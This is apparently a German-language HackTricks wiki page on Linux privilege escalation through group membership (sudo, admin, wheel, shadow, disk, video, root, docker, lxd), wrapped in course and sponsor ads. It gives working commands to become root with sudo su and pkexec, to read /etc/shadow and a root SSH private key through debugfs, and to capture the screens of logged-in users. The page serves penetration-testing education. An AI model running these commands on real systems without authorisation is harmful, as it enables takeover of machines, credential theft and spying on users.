{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Gruppen

## **PE - Methode 1**

**Manchmal**, **standardmäßig \(oder weil einige Software es benötigt\)** finden Sie in der **/etc/sudoers**-Datei einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, können Sie einfach ausführen**:
```text
sudo su
```
## PE - Methode 2

Finde alle SUID-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn Sie feststellen, dass die Binärdatei pkexec eine SUID-Binärdatei ist und Sie zu sudo oder admin gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit pkexec ausführen. Überprüfen Sie den Inhalt von:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort finden Sie, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** können in einigen Linux-Systemen **einige der Gruppen sudo oder admin** **erscheinen**.

Um **root zu werden, können Sie ausführen**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn Sie versuchen, **pkexec** auszuführen und Sie diese **Fehlermeldung** erhalten:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern daran, dass Sie ohne eine GUI nicht verbunden sind**. Und es gibt einen Workaround für dieses Problem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel-Gruppe

**Manchmal** **findet man standardmäßig** in der **/etc/sudoers**-Datei diese Zeile:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, können Sie **um root zu werden einfach ausführen**:
```text
sudo su
```
# Shadow-Gruppe

Benutzer der **Gruppe shadow** können die **/etc/shadow**-Datei **lesen**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lesen Sie die Datei und versuchen Sie, **einige Hashes zu knacken**.

# Disk Group

Dieses Privileg ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.

Dateien: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachten Sie, dass Sie mit debugfs auch **Dateien schreiben** können. Um beispielsweise `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, können Sie Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Allerdings, wenn Sie versuchen, **Dateien, die root gehören** \(wie `/etc/shadow` oder `/etc/passwd`\) zu **schreiben**, erhalten Sie einen "**Zugriff verweigert**" Fehler.

# Video Gruppe

Mit dem Befehl `w` können Sie **herausfinden, wer im System angemeldet ist** und es wird eine Ausgabe wie die folgende angezeigt:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** bedeutet, dass der Benutzer **yossi physisch** an einem Terminal auf der Maschine angemeldet ist.

Die **Video-Gruppe** hat Zugriff auf die Anzeige der Bildschirmausgabe. Grundsätzlich können Sie die Bildschirme beobachten. Um dies zu tun, müssen Sie **das aktuelle Bild auf dem Bildschirm** in Rohdaten erfassen und die Auflösung ermitteln, die der Bildschirm verwendet. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden, und Sie können die Auflösung dieses Bildschirms unter `/sys/class/graphics/fb0/virtual_size` finden.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **rohe Bild** zu **öffnen**, können Sie **GIMP** verwenden, die **`screen.raw`**-Datei auswählen und als Dateityp **Rohe Bilddaten** auswählen:

![](../../.gitbook/assets/image%20%28208%29.png)

Ändern Sie dann die Breite und Höhe auf die Werte, die auf dem Bildschirm verwendet werden, und überprüfen Sie verschiedene Bildtypen \(und wählen Sie den aus, der den Bildschirm besser darstellt\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root-Gruppe

Es scheint, dass standardmäßig **Mitglieder der Root-Gruppe** Zugriff auf die **Änderung** einiger **Dienst**-Konfigurationsdateien oder einiger **Bibliotheks**-Dateien oder **anderer interessanter Dinge** haben, die zur Eskalation von Rechten verwendet werden könnten...

**Überprüfen Sie, welche Dateien Root-Mitglieder ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker-Gruppe

Sie können das Root-Dateisystem des Host-Systems an das Volume einer Instanz anhängen, sodass beim Start der Instanz sofort ein `chroot` in dieses Volume geladen wird. Dies gibt Ihnen effektiv Root-Zugriff auf die Maschine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd-Gruppe

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterstützen</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
